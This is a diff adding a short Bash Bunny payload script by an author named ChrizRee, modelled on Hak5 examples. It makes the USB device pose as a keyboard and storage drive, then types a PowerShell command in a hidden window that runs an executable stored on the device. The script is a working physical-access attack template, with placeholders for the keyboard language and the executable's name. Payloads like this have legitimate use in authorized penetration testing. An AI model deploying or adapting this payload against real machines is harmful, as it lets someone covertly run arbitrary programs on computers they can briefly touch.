@@ -1,0 +1,22 @@
+# Title:         Execute exe from Bunny
+# Author:        ChrizRee
+# Version:       1.0
+# Target:        Windows
+#
+# Description:   Executes a binary executable from the Bunny storage
+#                Inspired by payload scripts available on the Hak5 GitHub
+#
+#                Two things needs to be changed in the payload below, DUCKY_LANG and specifying the exe file on the RUN WIN line
+#                The exe file of course needs to be located in the same switch directory as this payload
+
+
+DUCKY_LANG <replace_with_json_language_code>
+DRIVE_LABEL='BashBunny'
+GET SWITCH_POSITION
+ATTACKMODE HID STORAGE
+
+QUACK DELAY 1000
+RUN WIN powershell -windowstyle hidden ".((gwmi win32_volume -f 'label=''$DRIVE_LABEL''').Name+'payloads\\$SWITCH_POSITION\<name_of_executable>.exe')"
+
+QUACK DELAY 1000
+LED FINISH
